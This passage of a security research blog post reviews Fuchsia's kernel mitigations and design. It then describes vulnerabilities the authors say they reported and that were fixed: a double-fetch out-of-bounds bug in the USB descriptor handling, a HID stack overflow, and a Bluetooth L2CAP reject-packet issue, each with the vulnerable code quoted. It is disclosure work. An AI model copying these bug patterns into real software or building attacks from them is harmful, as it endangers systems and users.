&lt;p&gt;In terms of mitigations, Fuchsia uses &lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/Address_space_layout_randomization&quot;&gt;ASLR&lt;/a&gt; (mandatory for userland), &lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/W%5EX&quot;&gt;DEP&lt;/a&gt;, &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/SafeStack.html&quot;&gt;SafeStack&lt;/a&gt;, &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/ShadowCallStack.html&quot;&gt;ShadowCallStack&lt;/a&gt;, &lt;a class=&quot;reference external&quot; href=&quot;https://reviews.llvm.org/D54604&quot;&gt;AutoVarInit&lt;/a&gt;. The Zircon kernel is compiled with all of that by default.&lt;/p&gt;
&lt;p&gt;When it comes to security practices, it can be noted in the Fuchsia code that a lot of (all?) components have associated unit tests and fuzzers. The fuzzing is done via &lt;a class=&quot;reference external&quot; href=&quot;https://llvm.org/docs/LibFuzzer.html&quot;&gt;libfuzzer&lt;/a&gt; to fuzz internal structures within components, and via &lt;a class=&quot;reference external&quot; href=&quot;https://github.com/google/syzkaller&quot;&gt;syzkaller&lt;/a&gt; to fuzz the user-exposed syscalls. There is also support for the &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/AddressSanitizer.html&quot;&gt;ASan&lt;/a&gt; and &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html&quot;&gt;UBSan&lt;/a&gt; sanitizers, however no &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/MemorySanitizer.html&quot;&gt;MSan&lt;/a&gt; or &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/ThreadSanitizer.html&quot;&gt;TSan&lt;/a&gt; support seems to be present.&lt;/p&gt;
&lt;p&gt;Finally when it comes to programming languages, as said earlier, the components can be written in &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt;, &lt;tt class=&quot;docutils literal&quot;&gt;Go&lt;/tt&gt;, &lt;tt class=&quot;docutils literal&quot;&gt;Rust&lt;/tt&gt;. Arguably the language most prone to programming errors used here is &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt;. For &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt; code, the components usually override several operators to perform sanity checks; for example, the &lt;tt class=&quot;docutils literal&quot;&gt;[]&lt;/tt&gt; operator (used when accessing arrays) is often overloaded to make sure that the index is in the range of the array and doesn't overflow or underflow. Therefore, even on &quot;error-prone&quot; languages, some security measures are proactively put in place.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;where-we-at&quot; readability=&quot;14.938271604938&quot;&gt;
&lt;h2&gt;Where we at?&lt;/h2&gt;
&lt;p&gt;Let's sum up the design aspects so far from the security point of view:&lt;/p&gt;
&lt;ul class=&quot;simple&quot;&gt;&lt;li&gt;Fuchsia uses a micro kernel whose attack surface is limited by nature: few entry points, less complex logic.&lt;/li&gt;
&lt;li&gt;The system is organized in components which run in userland. This brings good segmentation properties: a vulnerability that affects a component compromises only its process.&lt;/li&gt;
&lt;li&gt;The components can actually be written in safe languages such as &lt;tt class=&quot;docutils literal&quot;&gt;Rust&lt;/tt&gt;, in which several classes of vulnerabilities simply do not exist.&lt;/li&gt;
&lt;li&gt;The components have their own virtual filesystem that can be sandboxed and that lives entirely on the user side. The kernel knows nothing about it.&lt;/li&gt;
&lt;li&gt;Access to components and syscalls is based on handles, which act as the only tokens the kernel knows about. They are abstracted as objects in the namespace.&lt;/li&gt;
&lt;li&gt;The mitigations provided by default in the kernel are rather good as of this writing.&lt;/li&gt;
&lt;li&gt;The components and kernel are fuzzed and unit-tested in a seemingly systematic manner.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;So what can we say about security in Fuchsia? Overall, its kernel design is inherently safer than Linux's, and the mitigations and security practices around it are better than those currently adopted in Linux.&lt;/p&gt;
&lt;p&gt;Two negative points can be noted:&lt;/p&gt;
&lt;ul class=&quot;simple&quot;&gt;&lt;li&gt;Fuchsia doesn't (yet?) support the &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/ControlFlowIntegrity.html&quot;&gt;CFI&lt;/a&gt; and &lt;a class=&quot;reference external&quot; href=&quot;https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf&quot;&gt;PAC&lt;/a&gt; mitigations. The latter is known to be strong.&lt;/li&gt;
&lt;li&gt;The fact that devhosts combine several components within one process weakens the segmentation model a bit when it comes to device drivers.&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;attacking-fuchsia&quot; readability=&quot;66.999091921026&quot;&gt;
&lt;h2&gt;Attacking Fuchsia&lt;/h2&gt;
&lt;p&gt;Contrary to every other major OS, it appears rather difficult to target the Zircon kernel directly. A successful RCE (&lt;em&gt;Remote Code Execution&lt;/em&gt;) on the world-facing parts of the system (USB, Bluetooth, network stack, etc) will only give you control over the targeted components, but they run in independent userland processes, not in the kernel. From a component, you then need to escalate privileges to the kernel using the limited number of syscalls you can access with the handles you have. Overall, it seems easier to target other components rather than the kernel, and to focus on components that you can talk to via IPC and that you know have interesting handles.&lt;/p&gt;
&lt;p&gt;For fun, we decided to do some vulnerability research in some parts of the system, to see how far we could go in limited time, and see whether the overall good security properties of Fuchsia really lived up to their promises.&lt;/p&gt;
&lt;p&gt;The issues listed below were all reported to Google, and have now been fixed.&lt;/p&gt;
&lt;div class=&quot;section&quot; id=&quot;usb-stack&quot; readability=&quot;30.732848232848&quot;&gt;
&lt;h3&gt;USB stack&lt;/h3&gt;
&lt;div class=&quot;section&quot; id=&quot;out-of-bounds-access&quot; readability=&quot;48.099434495759&quot;&gt;
&lt;h4&gt;Out-of-bounds access&lt;/h4&gt;
&lt;p&gt;When attaching a USB device to the machine, Fuchsia will fetch &lt;em&gt;descriptor tables&lt;/em&gt; from the device as part of the USB enumeration process. This is done by a component in the USB devhost. The component actually has a bug when handling &lt;em&gt;configuration descriptor tables&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;25&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;c1&quot;&gt;// read configuration descriptor header to determine size&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;usb_configuration_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USB_DT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                       &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_ERR_IO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;zxlogf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s: GetDescriptor(USB_DT_CONFIG) failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__func__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;letoh16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wTotalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_ERR_NO_MEMORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;config_descs_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// read full configuration descriptor&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USB_DT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config_desc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_ERR_IO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;zxlogf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s: GetDescriptor(USB_DT_CONFIG) failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__func__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's see what's going on here. First, the component fetches the &lt;tt class=&quot;docutils literal&quot;&gt;config_desc_header&lt;/tt&gt; structure, which has a fixed size; then, it reads the &lt;tt class=&quot;docutils literal&quot;&gt;wTotalLength&lt;/tt&gt; field of the structure, allocates a buffer of this size, and then re-fetches the table this time retrieving the full amount of data.&lt;/p&gt;
&lt;p&gt;Later in the USB stack, the &lt;tt class=&quot;docutils literal&quot;&gt;wTotalLength&lt;/tt&gt; value is trusted as being the total size of the structure, which kind of makes sense here.&lt;/p&gt;
&lt;p&gt;The problem is, between the first fetch and the second fetch the USB device could have modified the &lt;tt class=&quot;docutils literal&quot;&gt;wTotalLength&lt;/tt&gt; value. In fact, after the second fetch, &lt;tt class=&quot;docutils literal&quot;&gt;wTotalLength&lt;/tt&gt; could be bigger than the initial value; in that case the rest of the USB stack will still trust it, and will perform out-of-bounds accesses.&lt;/p&gt;
&lt;p&gt;As a reminder, the USB stack runs in userland and not in the kernel, so it's not a kernel bug.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/fd872ce1d485f9a2ee2793aa2e113f84352d5794&quot;&gt;[usb-device] Verify wTotalLength sanity&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;stack-overflow&quot; readability=&quot;29.919773095624&quot;&gt;
&lt;h4&gt;Stack overflow&lt;/h4&gt;
&lt;p&gt;While navigating through the USB code, we noticed a function that had an apparent stack overflow:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;19&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;zx_status_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HidDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HidDeviceGetReport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hid_report_type_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpt_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpt_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                          &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out_report_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                          &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out_report_actual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;input_report_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;needed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetReportSizeById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpt_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReportType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpt_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;needed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_ERR_NOT_FOUND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;needed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_ERR_BUFFER_TOO_SMALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HID_MAX_REPORT_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;zx_status_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hidbus_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetReport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpt_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpt_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;needed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;actual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In short, the &lt;tt class=&quot;docutils literal&quot;&gt;GetReportSizeById()&lt;/tt&gt; function returns a 16-bit value previously obtained from the USB device. &lt;tt class=&quot;docutils literal&quot;&gt;HID_MAX_REPORT_LEN&lt;/tt&gt; has the value &lt;tt class=&quot;docutils literal&quot;&gt;8192&lt;/tt&gt;. Here, the call to &lt;tt class=&quot;docutils literal&quot;&gt;GetReport()&lt;/tt&gt; can overflow the &lt;tt class=&quot;docutils literal&quot;&gt;report&lt;/tt&gt; array with USB-controllable data.&lt;/p&gt;
&lt;p&gt;It appears that there is no relevant user of this function that could make it USB-triggerable, so it's a bit of an uninteresting bug. Note also that with the &lt;a class=&quot;reference external&quot; href=&quot;https://clang.llvm.org/docs/SafeStack.html&quot;&gt;SafeStack&lt;/a&gt; mitigation, the &lt;tt class=&quot;docutils literal&quot;&gt;report&lt;/tt&gt; array is actually in the &lt;em&gt;unsafe stack&lt;/em&gt;, which means that overflowing it will not allow the attacker to overwrite the return instruction pointer.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/ba8bd54cda59bb55e62a390b7fd0bcafcc72c034&quot;&gt;[hid] Fix GetReport buffer overrun&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;bluetooth-stack&quot; readability=&quot;27.679744773283&quot;&gt;
&lt;h3&gt;Bluetooth stack&lt;/h3&gt;
&lt;div class=&quot;section&quot; id=&quot;l2cap-reject-packets&quot; readability=&quot;38.933064921993&quot;&gt;
&lt;h4&gt;L2CAP: &lt;tt class=&quot;docutils literal&quot;&gt;reject&lt;/tt&gt; packets&lt;/h4&gt;
&lt;p&gt;To handle &lt;tt class=&quot;docutils literal&quot;&gt;reject&lt;/tt&gt; packets, the &lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Logical_link_control_and_adaptation_protocol_(L2CAP)&quot;&gt;L2CAP&lt;/a&gt; protocol uses this piece of code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;ResponseT&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Status&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kReject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ParseReject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bt_log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;l2cap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd: ignoring malformed Command Reject, size %zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;rsp_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
